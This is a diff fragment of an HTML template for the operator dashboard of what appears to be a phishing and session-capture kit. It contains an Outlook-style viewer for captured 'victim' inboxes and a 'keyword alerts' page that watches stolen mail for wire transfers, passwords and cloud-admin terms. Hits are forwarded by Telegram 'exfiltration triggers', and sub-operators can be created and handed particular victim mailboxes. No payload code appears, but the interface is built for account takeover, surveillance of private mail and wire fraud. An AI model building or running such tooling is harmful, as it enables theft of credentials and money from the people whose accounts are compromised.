+                                    <th>ACTIONS</th>
+                                </tr>
+                            </thead>
+                            <tbody id="lg-deployments-tbody">
+                                <!-- Populated dynamically by loadDeploymentsTable() -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="page-mailbox" class="page {{ 'active' if user_role == 'operator' else '' }}" style="padding:0; overflow:hidden;">
+            <div class="outlook-viewport">
+                <!-- 1. Top Blue Suite Bar (#0078d4) -->
+                <div class="m365-suite-bar">
+                    <div class="m365-brand">
+                        <div class="m365-waffle" title="App launcher">
+                            <span></span><span></span><span></span>
+                            <span></span><span></span><span></span>
+                            <span></span><span></span><span></span>
+                        </div>
+                        <span>Outlook</span>
+                    </div>
+
+                    <!-- Operator Welcome Banner (shown in operator console) -->
+                    <div id="operator-welcome-banner" style="{{ 'display:flex;' if user_role == 'operator' else 'display:none;' }} align-items:center; gap:8px; margin-left:14px; padding-left:14px; border-left:1px solid rgba(255,255,255,0.25);">
+                        <span style="font-size:10px; text-transform:uppercase; letter-spacing:0.07em; opacity:0.85; font-weight:800; color:#e0f2fe;">WELCOME</span>
+                        <span id="op-welcome-name" style="font-size:13px; font-weight:800; color:#ffffff; letter-spacing:0.02em;">{{ user_name if user_role == 'operator' else 'Operator' }}</span>
+                    </div>
+
+                    <!-- Centered Search Pill with Realtime Input -->
+                    <div class="m365-search-pill">
+                        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 14z"/></svg>
+                        <input type="text" id="outlook-search-input" placeholder="Search" oninput="onRealtimeSearch(this.value)">
+                        <span id="search-clear-btn" style="display:none; cursor:pointer; color:#605e5c; padding:0 6px; font-size:14px;" onclick="clearSearch()" title="Clear search">✕</span>
+                    </div>
+
+                    <!-- Suite Bar Right Controls: Settings Gear & Profile Avatar -->
+                    <div class="m365-suite-actions">
+                        <button type="button" class="m365-suite-btn" id="suite-btn-op-tg" onclick="openOperatorTelegramModal()" title="Operator Telegram Alerts (⚙️)" style="{{ 'display:inline-flex;' if user_role == 'operator' else 'display:none;' }}">
+                            🔔
+                        </button>
+                        <button type="button" class="m365-suite-btn" id="suite-btn-settings" onclick="openMailboxSettings()" title="Mailbox Settings (⚙️)">
+                            ⚙️
+                        </button>
+                        <div id="outlook-top-avatar" class="m365-avatar-btn" onclick="openMailboxSettings()" title="Account Settings">
+                            U
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 2. Main Row: Outlook Workspace -->
+                <div class="outlook-main-row">
+                    <!-- Outlook Content Area -->
+                    <div class="outlook-content-area">
+                        <!-- Menu Bar (File, Home, View, Help) -->
+                        <div class="outlook-menu-tabs">
+                            <div class="outlook-menu-item" style="padding:4px 6px;">☰</div>
+                            <div class="outlook-menu-item">File</div>
+                            <div class="outlook-menu-item active">Home</div>
+                            <div class="outlook-menu-item">View</div>
+                            <div class="outlook-menu-item">Help</div>
+                        </div>
+
+                        <!-- Command Ribbon -->
+                        <div class="outlook-command-ribbon">
+                            <div class="ribbon-split-btn" onclick="openComposeModal()" title="New mail">
+                                <div class="ribbon-split-main">
+                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+                                    <span>New mail</span>
+                                </div>
+                                <div class="ribbon-split-arrow">▼</div>
+                            </div>
+
+                            <button class="ribbon-btn" id="ribbon-btn-delete" onclick="deleteCurrentMessage()" title="Delete">
+                                <span>🗑️</span> Delete
+                            </button>
+                            <button class="ribbon-btn" id="ribbon-btn-restore" onclick="restoreCurrentMessage()" style="display:none; color:#107c10; font-weight:600;" title="Restore to Inbox">
+                                <span>♻️</span> Restore
+                            </button>
+                            <button class="ribbon-btn" onclick="archiveCurrentMessage()" title="Archive">
+                                <span>📥</span> Archive
+                            </button>
+                            <div class="ribbon-separator"></div>
+                            <button class="ribbon-btn" onclick="replyCurrentMessage()" title="Reply">
+                                <span>↩️</span> Reply
+                            </button>
+                            <button class="ribbon-btn" onclick="replyAllCurrentMessage()" title="Reply all">
+                                <span>↩️↩️</span> Reply all
+                            </button>
+                            <button class="ribbon-btn" onclick="toggleReadStatus()" title="Mark as Read or Unread">
+                                <span>✉️</span> Read / Unread
+                            </button>
+                            <button class="ribbon-btn" onclick="toggleFlagStatus()" title="Flag message">
+                                <span>🚩</span> Flag
+                            </button>
+                            <div class="ribbon-separator"></div>
+                            <button class="ribbon-btn" onclick="openMailboxSettings()" title="Settings">
+                                <span>⚙️</span> Mailbox Settings
+                            </button>
+                            <button class="ribbon-btn" onclick="refreshCurrentFolder()" title="Sync mailbox">
+                                <span>🔄</span> Sync
+                            </button>
+
+                            <!-- Account Switcher Dropdown embedded into Ribbon -->
+                            <select id="mailbox-session" class="ribbon-account-select" onchange="loadMailbox()"></select>
+                        </div>
+
+                        <!-- 3-Pane Outlook Layout -->
+                        <div class="outlook-3pane-layout">
+                            <!-- Column 1: Folder Pane -->
+                            <div class="outlook-col-folders">
+                                <div class="folder-group-title">
+                                    <span>⌄</span> <b>Favorites</b>
+                                </div>
+                                <div id="group-favs-items">
+                                    <div class="folder-tree-node active" id="fav-inbox" onclick="selectFavoritesInbox()">
+                                        <span>📥 Inbox</span>
+                                        <span class="folder-badge-blue" id="fav-inbox-badge"></span>
+                                    </div>
+                                    <div class="folder-tree-node" onclick="selectFavoritesFolder('Sent Items')">
+                                        <span>📤 Sent Items</span>
+                                    </div>
+                                    <div class="folder-tree-node" onclick="selectFavoritesFolder('Deleted Items')">
+                                        <span>🗑️ Deleted Items</span>
+                                    </div>
+                                </div>
+
+                                <div class="folder-group-title" style="margin-top:10px;">
+                                    <span>⌄</span> <b id="folder-user-email-header">user@outlook.com</b>
+                                </div>
+                                <div id="mailbox-folders">
+                                    <div style="padding:12px 24px; color:#605e5c;">Loading folders...</div>
+                                </div>
+
+                                <div class="folder-tree-node" style="margin-top:16px; color:#605e5c;">
+                                    <span>👥 Go to Groups</span>
+                                </div>
+                            </div>
+
+                            <!-- Column 2: Message List Pane -->
+                            <div class="outlook-col-messages">
+                                <div class="messages-tab-bar">
+                                    <div class="messages-tab-group">
+                                        <div class="tab-button active" id="tab-focused" onclick="switchFilterTab('focused')">Focused</div>
+                                        <div class="tab-button" id="tab-other" onclick="switchFilterTab('other')">Other</div>
+                                    </div>
+                                    <div class="messages-tab-tools">
+                                        <input type="checkbox" id="select-all-cb" title="Select / deselect all" onchange="toggleSelectAll(this.checked)" style="width:15px;height:15px;cursor:pointer;accent-color:#0078d4;">
+                                        <span title="Filter">≡</span>
+                                        <span title="Sort by date">⇅</span>
+                                    </div>
+                                </div>
+
+                                <div class="messages-group-label">
+                                    <span>⌄</span> <span id="current-folder-date-group">This Month</span>
+                                </div>
+
+                                <!-- Bulk action bar (shown when ≥1 selected) -->
+                                <div id="bulk-action-bar" style="display:none; align-items:center; gap:6px; padding:6px 12px; background:#f3f2f1; border-bottom:1px solid #e1dfdd; flex-wrap:wrap;">
+                                    <span id="bulk-count-label" style="font-size:.82em;color:#323130;font-weight:600;margin-right:4px;">0 selected</span>
+                                    <button class="ribbon-btn" style="padding:4px 10px;font-size:.8em;" onclick="bulkDelete()">🗑️ Delete</button>
+                                    <button class="ribbon-btn" style="padding:4px 10px;font-size:.8em;" onclick="bulkMarkRead(true)">✉️ Mark Read</button>
+                                    <button class="ribbon-btn" style="padding:4px 10px;font-size:.8em;" onclick="bulkMarkRead(false)">📩 Mark Unread</button>
+                                    <button class="ribbon-btn" style="padding:4px 10px;font-size:.8em;" onclick="bulkMove('deleteditems')">🗑 Move to Deleted</button>
+                                    <button class="ribbon-btn" style="padding:4px 10px;font-size:.8em;" onclick="bulkMove('archive')">📁 Archive</button>
+                                    <button class="ribbon-btn" style="padding:4px 10px;font-size:.8em;" onclick="bulkMove('junkemail')">🚫 Junk</button>
+                                    <button class="ribbon-btn" style="padding:4px 10px;font-size:.8em;color:#d13438;" onclick="clearBulkSelection()">✕ Clear</button>
+                                </div>
+
+                                <div class="messages-scroll-area" id="mailbox-list">
+                                    <div style="padding:40px 20px; text-align:center; color:#605e5c;">
+                                        Select a folder to view emails
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Column 3: Reading Pane -->
+                            <div class="outlook-col-reading" id="mailbox-reader">
+                                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:#605e5c;">
+                                    <div style="font-size:42px; margin-bottom:12px; opacity:0.5;">✉️</div>
+                                    <div style="font-size:16px; font-weight:600; color:#323130;">Select an item to read</div>
+                                    <div style="font-size:13px; color:#605e5c; margin-top:4px;">Click an email on the left to read its full contents</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ═══════════════ KEYWORD ALERTS & SURVEILLANCE PAGE ═══════════════ -->
+        <div id="page-keyword-alerts" class="page" style="padding:0; overflow:hidden;">
+            <div class="kwa-container">
+                <!-- Top Header Bar -->
+                <div class="kwa-header">
+                    <div style="display:flex; align-items:center; gap:12px;">
+                        <span style="font-size:24px;">🔔</span>
+                        <div>
+                            <div style="font-weight:800; font-size:1.15rem; color:#fff; letter-spacing:0.02em;">KEYWORD ALERTS</div>
+                            <div style="font-size:12px; color:#a49498;">Real-time victim inbox intelligence and automated Telegram exfiltration triggers</div>
+                        </div>
+                    </div>
+                    <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
+                        <button type="button" class="btn btn-primary" onclick="openNewKeywordRuleModal()" style="display:flex; align-items:center; gap:6px;">
+                            <span>➕</span> New Rule
+                        </button>
+                        <button type="button" class="btn btn-secondary" id="kwa-btn-scan-now" onclick="triggerKeywordScanNow()" style="display:flex; align-items:center; gap:6px;">
+                            <span>▶</span> Run Scan Now
+                        </button>
+                        <button type="button" class="btn btn-secondary" onclick="openKeywordTelegramModal()" style="display:flex; align-items:center; gap:6px; color:#58a6ff; border-color:rgba(88,166,255,0.35);">
+                            <span>✈️</span> Telegram
+                        </button>
+                        <button type="button" class="btn btn-secondary" id="kwa-btn-refresh-feed" onclick="triggerKeywordScanNow(false)" title="Scan Inboxes & Refresh Feed" style="padding:8px 12px;">
+                            <span>🔄</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- KPI Metric Counters Strip -->
+                <div class="kwa-stats-strip">
+                    <div class="kwa-stat-card">
+                        <div class="kwa-stat-val" id="kwa-stat-rules">0</div>
+                        <div class="kwa-stat-lbl">Active Watchlists</div>
+                    </div>
+                    <div class="kwa-stat-card">
+                        <div class="kwa-stat-val" id="kwa-stat-victims">0</div>
+                        <div class="kwa-stat-lbl">Victims Monitored</div>
+                    </div>
+                    <div class="kwa-stat-card">
+                        <div class="kwa-stat-val" id="kwa-stat-hits" style="color:#e50914;">0</div>
+                        <div class="kwa-stat-lbl">Total Intelligence Hits</div>
+                    </div>
+                    <div class="kwa-stat-card">
+                        <div class="kwa-stat-val" id="kwa-stat-critical" style="color:#f85149;">0</div>
+                        <div class="kwa-stat-lbl">Critical Priority Hits</div>
+                    </div>
+                </div>
+
+                <!-- Main Split: Rules on Left, Live Matches Feed on Right -->
+                <div class="kwa-split-wrap">
+                    <!-- Left: Watchlists / Rules Panel -->
+                    <div class="kwa-rules-panel">
+                        <div class="kwa-rules-header">
+                            <div style="font-weight:700; font-size:13px; color:#fff; display:flex; align-items:center; gap:6px;">
+                                <span>📋</span> WATCHLIST RULES (<span id="kwa-rules-count">0</span>)
+                            </div>
+                            <div style="display:flex; gap:6px;">
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="openNewKeywordRuleModal()" style="padding:2px 8px; font-size:11px;">+ Add</button>
+                            </div>
+                        </div>
+
+                        <!-- Quick-Add Red Team Presets Bar -->
+                        <div style="padding:10px 14px; background:#140c11; border-bottom:1px solid #240e13; display:flex; flex-direction:column; gap:6px;">
+                            <div style="font-size:10px; font-weight:800; color:#8e7d82; text-transform:uppercase; letter-spacing:0.04em;">Quick Presets:</div>
+                            <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('wire')" style="font-size:11px; padding:3px 8px;">💰 Wire/Bank</button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('creds')" style="font-size:11px; padding:3px 8px;">🔑 Passwords</button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('exec')" style="font-size:11px; padding:3px 8px;">⚖️ Confidential</button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('cloud')" style="font-size:11px; padding:3px 8px;">☁️ Cloud Admin</button>
+                            </div>
+                        </div>
+
+                        <!-- Rules List -->
+                        <div class="kwa-rules-list" id="kwa-rules-list">
+                            <!-- Populated dynamically via JS -->
+                        </div>
+                    </div>
+
+                    <!-- Right: Live Matches Feed Panel -->
+                    <div class="kwa-feed-panel">
+                        <!-- Filter Toolbar -->
+                        <div class="kwa-feed-toolbar">
+                            <input type="text" id="kwa-search-input" placeholder="Search matches by keyword, victim, subject, snippet..." oninput="filterKeywordMatches()" style="flex:1; min-width:200px; background:#160e13; border:1px solid #2e1216; color:#fff; padding:7px 12px; border-radius:6px; font-size:12.5px; outline:none;">
+                            
+                            <select id="kwa-filter-severity" onchange="loadKeywordMatches()" style="background:#160e13; border:1px solid #2e1216; color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
+                                <option value="ALL">All Severities</option>
+                                <option value="CRITICAL">🔴 Critical Only</option>
+                                <option value="HIGH">🟠 High Only</option>
+                                <option value="MEDIUM">🟡 Medium Only</option>
+                                <option value="INFO">🔵 Info Only</option>
+                            </select>
+
+                            <select id="kwa-filter-account" onchange="loadKeywordMatches()" style="background:#160e13; border:1px solid #2e1216; color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
+                                <option value="ALL">All Victims</option>
+                            </select>
+
+                            <select id="kwa-filter-triaged" onchange="loadKeywordMatches()" style="background:#160e13; border:1px solid #2e1216; color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
+                                <option value="ALL">All Statuses</option>
+                                <option value="0" selected>⚡ New / Unreviewed</option>
+                                <option value="1">✓ Triaged</option>
+                            </select>
+
+                            <button type="button" class="btn btn-secondary btn-sm" onclick="clearAllKeywordMatches()" style="color:#ff6b72; padding:6px 12px; font-size:11.5px;">
+                                🗑️ Clear All Hits
+                            </button>
+                        </div>
+
+                        <!-- Matches Feed Stream -->
+                        <div class="kwa-feed-list" id="kwa-feed-list">
+                            <!-- Populated dynamically via JS -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Keyword Rule Modal -->
+        <div id="kwaRuleModal" class="modal-overlay">
+            <div class="modal" style="max-width: 620px;">
+                <div class="modal-header">
+                    <h2 id="kwa-modal-title" style="display:flex; align-items:center; gap:8px;">➕ Create Keyword Rule</h2>
+                    <button class="close-btn" onclick="closeKeywordRuleModal()">&times;</button>
+                </div>
+                <form id="kwa-rule-form" onsubmit="saveKeywordRule(event)" style="display:flex; flex-direction:column; gap:16px;">
+                    <input type="hidden" id="kwa-rule-id" value="">
+                    <div>
+                        <label class="token-label">RULE NAME</label>
+                        <input type="text" id="kwa-rule-name" class="lg-input" placeholder="e.g. Wire Fraud & Banking" required style="width:100%;">
+                    </div>
+                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:14px;">
+                        <div>
+                            <label class="token-label">CATEGORY</label>
+                            <select id="kwa-rule-category" class="lg-input" style="width:100%;">
+                                <option value="Finance">💰 Finance & Wire</option>
+                                <option value="Credentials">🔑 Credentials & Access</option>
+                                <option value="Executive">⚖️ Executive & Legal</option>
+                                <option value="Infrastructure">☁️ Cloud & IT</option>
+                                <option value="Custom" selected>🎯 Custom</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="token-label">SEVERITY PRIORITY</label>
+                            <select id="kwa-rule-severity" class="lg-input" style="width:100%;">
+                                <option value="CRITICAL">🔴 Critical (Immediate Attention)</option>
+                                <option value="HIGH" selected>🟠 High</option>
+                                <option value="MEDIUM">🟡 Medium</option>
+                                <option value="INFO">🔵 Info / Low</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="token-label">KEYWORDS (COMMA SEPARATED)</label>
+                        <textarea id="kwa-rule-keywords" class="lg-input" rows="3" placeholder="wire transfer, swift, routing number, invoice overdue, payment" required style="width:100%; resize:vertical; font-family:monospace; font-size:12.5px;"></textarea>
+                        <span style="font-size:11px; color:#a49498;">Case-insensitive substring match. Separate multiple search terms with commas.</span>
+                    </div>
+                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:14px;">
+                        <div>
+                            <label class="token-label">SEARCH SCOPE</label>
+                            <select id="kwa-rule-scope" class="lg-input" style="width:100%;">
+                                <option value="all" selected>All (Subject, Body & Sender)</option>
+                                <option value="subject">Subject Line Only</option>
+                                <option value="body">Body Preview Only</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="token-label">TARGET INBOX ACCOUNT</label>
+                            <select id="kwa-rule-account" class="lg-input" style="width:100%;">
+                                <option value="all" selected>All Captured Accounts</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div style="display:flex; gap:20px; align-items:center; padding:10px 0; border-top:1px solid #281014; border-bottom:1px solid #281014;">
+                        <label style="display:flex; align-items:center; gap:8px; cursor:pointer; font-size:0.85rem;">
+                            <input type="checkbox" id="kwa-rule-tg" checked style="accent-color:#e50914;">
+                            <span>Dispatch Telegram Alert</span>
+                        </label>
+                        <label style="display:flex; align-items:center; gap:8px; cursor:pointer; font-size:0.85rem;">
+                            <input type="checkbox" id="kwa-rule-wh" checked style="accent-color:#e50914;">
+                            <span>Dispatch Webhook Alert</span>
+                        </label>
+                    </div>
+                    <div style="display:flex; justify-content:flex-end; gap:10px; margin-top:6px;">
+                        <button type="button" class="btn btn-secondary" onclick="closeKeywordRuleModal()">Cancel</button>
+                        <button type="submit" class="btn btn-primary" id="kwa-rule-submit-btn">Save Rule</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Dedicated Telegram Configuration Modal for Keyword Alerts -->
+        <div id="kwaTelegramModal" class="modal-overlay">
+            <div class="modal" style="max-width: 600px;">
+                <div class="modal-header">
+                    <h2 style="display:flex; align-items:center; gap:8px;">
+                        <span>✈️</span> Dedicated Telegram Bot Setup
+                    </h2>
+                    <button class="close-btn" onclick="closeKeywordTelegramModal()">&times;</button>
+                </div>
+                <div style="font-size:0.8rem; color:#a49498; line-height:1.5; background:#120b10; border:1px solid #2e1216; border-radius:6px; padding:12px; margin-bottom:16px;">
+                    💡 <b>Dedicated Intelligence Bot:</b> Keyword alerts use their own separate bot and chat ID to ensure high-priority mailbox surveillance notifications are isolated from routine victim sign-in alerts.
+                </div>
+                <form id="kwa-telegram-form" onsubmit="saveKeywordTelegramConfig(event)" style="display:flex; flex-direction:column; gap:16px;">
+                    <div>
+                        <label class="token-label">TELEGRAM BOT TOKEN</label>
+                        <input type="text" id="kwa-tg-bot-token" class="lg-input" placeholder="e.g. 7123456789:AAH_..." required style="width:100%; font-family:monospace; font-size:12.5px;">
+                        <span style="font-size:11px; color:#8e7d82;">HTTP API token created via @BotFather on Telegram.</span>
+                    </div>
+                    <div>
+                        <label class="token-label">CHAT ID / CHANNEL ID</label>
+                        <input type="text" id="kwa-tg-chat-id" class="lg-input" placeholder="e.g. 123456789 or -100..." required style="width:100%; font-family:monospace; font-size:12.5px;">
+                        <span style="font-size:11px; color:#8e7d82;">Your numerical Telegram ID (from @userinfobot) or target channel/group ID.</span>
+                    </div>
+                    <div style="padding:10px 0; border-top:1px solid #281014; border-bottom:1px solid #281014;">
+                        <label style="display:flex; align-items:center; gap:8px; cursor:pointer; font-size:0.85rem; color:#f0ebed;">
+                            <input type="checkbox" id="kwa-tg-enabled" checked style="accent-color:#e50914;">
+                            <span>Enable Telegram Notifications for Keyword Matches</span>
+                        </label>
+                    </div>
+
+                    <!-- Live Status Feedback Banner inside modal -->
+                    <div id="kwa-tg-status-banner" style="display:none; padding:10px 14px; border-radius:6px; font-size:12px; font-weight:600;"></div>
+
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-top:4px;">
+                        <button type="button" class="btn btn-secondary" id="kwa-btn-test-tg" onclick="testKeywordTelegramDirectly()" style="color:#58a6ff; border-color:rgba(88,166,255,0.3); display:flex; align-items:center; gap:6px;">
+                            <span>🧪</span> Send Test Telegram
+                        </button>
+                        <div style="display:flex; gap:10px;">
+                            <button type="button" class="btn btn-secondary" onclick="closeKeywordTelegramModal()">Cancel</button>
+                            <button type="submit" class="btn btn-primary" id="kwa-btn-save-tg">💾 Save Config</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Modal: Add / Edit Operator & Mailbox Delegation -->
+        <div id="operatorModal" class="modal-overlay">
+            <div class="modal" style="max-width: 620px;">
+                <div class="modal-header">
+                    <h2 id="op-modal-title" style="display:flex; align-items:center; gap:8px;">
+                        <span>👤</span> <span id="op-modal-title-text">Create Operator Account</span>
+                    </h2>
+                    <button class="close-btn" onclick="closeOperatorModal()">&times;</button>
+                </div>
+                <div style="font-size:0.8rem; color:#a49498; line-height:1.5; background:#120b10; border:1px solid #2e1216; border-radius:6px; padding:12px; margin-bottom:16px;">
+                    🛡️ <b>Delegated Mailbox Access:</b> Operators have restricted access strictly to the Mailbox console. They can ONLY view and explore the specific victim inboxes selected below.
+                </div>
+                <form id="operator-form" onsubmit="saveOperator(event)" style="display:flex; flex-direction:column; gap:16px;">
+                    <input type="hidden" id="op-id-input" value="">
+                    <div>
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                            <label class="token-label" style="margin:0;">OPERATOR NAME</label>
+                            <button type="button" class="btn btn-secondary btn-sm" id="op-btn-regen-user" onclick="rollOperatorUsername()" style="padding:2px 8px; font-size:10px; display:inline-flex; align-items:center; gap:4px;">
+                                <span>🎲</span> Generate New
+                            </button>
+                        </div>
+                        <input type="text" id="op-username-input" class="lg-input" placeholder="e.g. NjallaRaslan" required style="width:100%; font-family:monospace; font-weight:700; color:#58a6ff;">
+                        <span style="font-size:10.5px; color:#8e7d82;">Autogenerated operative name used by operator.</span>
+                    </div>
+                    <div>
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                            <label class="token-label" style="margin:0;">ACCESS KEY / PASSWORD <span id="op-pwd-hint" style="display:none; color:#a49498; font-weight:normal; text-transform:none;">(Leave blank to keep current)</span></label>
+                            <button type="button" class="btn btn-secondary btn-sm" id="op-btn-regen-pwd" onclick="rollOperatorPassword()" style="padding:2px 8px; font-size:10px; display:inline-flex; align-items:center; gap:4px;">
+                                <span>🎲</span> Generate Key
+                            </button>
+                        </div>
+                        <div style="position:relative;">
+                            <input type="text" id="op-password-input" class="lg-input" placeholder="Enter or generate access key" style="width:100%; font-family:monospace; font-size:12.5px; padding-right:70px;">
+                            <button type="button" onclick="copyOperatorModalKey()" style="position:absolute; right:6px; top:50%; transform:translateY(-50%); background:#241216; border:1px solid #3d1c23; color:#f0ebed; padding:3px 8px; border-radius:4px; font-size:11px; cursor:pointer;" title="Copy Access Key">📋 Copy</button>
+                        </div>
+                        <span style="font-size:10.5px; color:#8e7d82;">Secret credential provided to the operator to access the mailbox.</span>
+                    </div>
+                    <div>
+                        <label class="token-label">ACCOUNT STATUS</label>
+                        <select id="op-status-input" class="lg-input" style="width:100%;">
+                            <option value="active" selected>🟢 Active (Access Allowed)</option>
+                            <option value="disabled">🔴 Disabled (Access Suspended)</option>
+                        </select>
+                    </div>
+                    <div>
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                            <label class="token-label" style="margin:0;">DELEGATED VICTIM MAILBOXES</label>
+                            <div style="display:flex; gap:10px; font-size:11px;">
+                                <a href="javascript:void(0)" onclick="selectAllOperatorSessions(true)" style="color:#58a6ff; text-decoration:none;">Select All</a>
+                                <span style="color:#482329;">|</span>
+                                <a href="javascript:void(0)" onclick="selectAllOperatorSessions(false)" style="color:#a49498; text-decoration:none;">Clear All</a>
+                            </div>
+                        </div>
+                        <div id="op-sessions-checklist" style="max-height:190px; overflow-y:auto; background:#0e080b; border:1px solid #281014; border-radius:6px; padding:10px; display:flex; flex-direction:column; gap:8px;">
+                            <div style="color:#a49498; font-size:12px; text-align:center; padding:10px;">Loading captured sessions...</div>
+                        </div>
+                        <span style="font-size:11px; color:#8e7d82; margin-top:4px; display:block;">Check the victim accounts this operator is authorized to inspect.</span>
+                    </div>
+
+                    <div style="display:flex; justify-content:space-between; align-items:center; gap:10px; margin-top:6px;">
+                        <button type="button" class="btn btn-secondary btn-sm" id="op-modal-copy-btn" onclick="copyCurrentEditingOperatorInfo()" style="display:none; padding:7px 12px; font-size:12px; background:#1b2838; border:1px solid #2d4868; color:#58a6ff; font-weight:700;">
+                            📋 Copy Account Info
+                        </button>
+                        <div style="display:flex; gap:10px; margin-left:auto;">
+                            <button type="button" class="btn btn-secondary" onclick="closeOperatorModal()">Cancel</button>
+                            <button type="submit" class="btn btn-primary" id="op-btn-save">💾 Save Operator</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Modal: Newly Created Operator Credentials Summary -->
+        <div id="opCredentialsModal" class="modal-overlay">
+            <div class="modal" style="max-width: 540px; border-color:#3d1c23;">
+                <div class="modal-header">
+                    <h2 style="display:flex; align-items:center; gap:8px; color:#3fb950;">
+                        <span>🎉</span> Operator Created Successfully!
+                    </h2>
+                    <button class="close-btn" onclick="closeOpCredentialsModal()">&times;</button>
+                </div>
+                <div style="font-size:0.85rem; color:#a49498; margin-bottom:16px;">
+                    Provide the following login credentials to the operator. They will have access strictly to the delegated victim inboxes.
+                </div>
+                <div style="background:#0e080b; border:1px solid #281014; border-radius:8px; padding:16px; display:flex; flex-direction:column; gap:12px; margin-bottom:20px;">
+                    <div>
+                        <div style="font-size:10px; color:#8e7d82; text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">LOGIN PORTAL URL</div>
+                        <div id="op-cred-url" style="font-family:monospace; color:#58a6ff; font-size:13px; margin-top:2px;">http://127.0.0.1:5000/login</div>
+                    </div>
+                    <div>
+                        <div style="font-size:10px; color:#8e7d82; text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">OPERATOR NAME</div>
+                        <div id="op-cred-user" style="font-family:monospace; color:#ffffff; font-size:15px; font-weight:800; margin-top:2px;">NjallaRaslan</div>
+                    </div>
+                    <div>
+                        <div style="font-size:10px; color:#8e7d82; text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">ACCESS KEY (PASSWORD)</div>
+                        <div id="op-cred-pass" style="font-family:monospace; color:#ffd32a; font-size:15px; font-weight:800; margin-top:2px;">••••••••••••</div>
+                    </div>
+                    <div>
+                        <div style="font-size:10px; color:#8e7d82; text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">DELEGATED INBOXES</div>
+                        <div id="op-cred-inboxes" style="font-size:12px; color:#f0ebed; margin-top:2px;">0 accounts assigned</div>
+                    </div>
+                </div>
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <button type="button" class="btn btn-secondary" onclick="closeOpCredentialsModal()">Close</button>
+                    <button type="button" class="btn btn-primary" onclick="copyOperatorCredentialsPackage()" style="display:flex; align-items:center; gap:6px;">
+                        <span>📋</span> Copy All Credentials
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="page-sessions" class="page">
+            <div class="page-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
+                <h1>Live Sessions</h1>
+                <div style="display:flex; align-items:center; gap:12px; font-size:0.85em; color:var(--text-secondary);">
+                    <button class="btn btn-secondary btn-sm" onclick="purgeInactiveSessions()" style="display:inline-flex; align-items:center; gap:6px; background:#1c1014; border-color:#38161b; color:#ff8b94;" title="Purge expired and abandoned non-captured visitor sessions">
+                        <span>🧹</span> Clear Inactive Sessions
+                    </button>
+                    <div style="display:flex; align-items:center; gap:6px;">
+                        <label for="sessions-page-size" style="cursor:pointer;">Show</label>
+                        <select id="sessions-page-size" class="btn btn-secondary btn-sm" style="background:#161014; border:1px solid #38161b; color:#f0ebed; padding:4px 8px; border-radius:4px; font-size:12px; cursor:pointer;" onchange="changeSessionsPageSize(this.value)">
+                            <option value="10" selected>10</option>
+                            <option value="25">25</option>
+                            <option value="50">50</option>
+                            <option value="100">100</option>
+                        </select>
+                        <span>entries</span>
+                    </div>
+                </div>
+            </div>
+            <div class="page-body">
+                <div class="card">
+                    <div class="table-wrapper">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>User Code</th>
+                                    <th>Target / Template</th>
+                                    <th>Visitor IP</th>
+                                    <th>Client / Browser</th>
+                                    <th>Live Stage &amp; Activity</th>
+                                    <th>Started</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="sessions-table"></tbody>
+                        </table>
+                    </div>
+                    <div id="sessions-pagination-bar" style="display:flex; justify-content:space-between; align-items:center; margin-top:14px; font-size:0.85em; color:var(--text-secondary); flex-wrap:wrap; gap:12px;">
+                        <div id="sessions-pagination-info">Showing 0 to 0 of 0 sessions</div>
+                        <div id="sessions-pagination-controls" style="display:flex; gap:6px; align-items:center;"></div>
+                    </div>
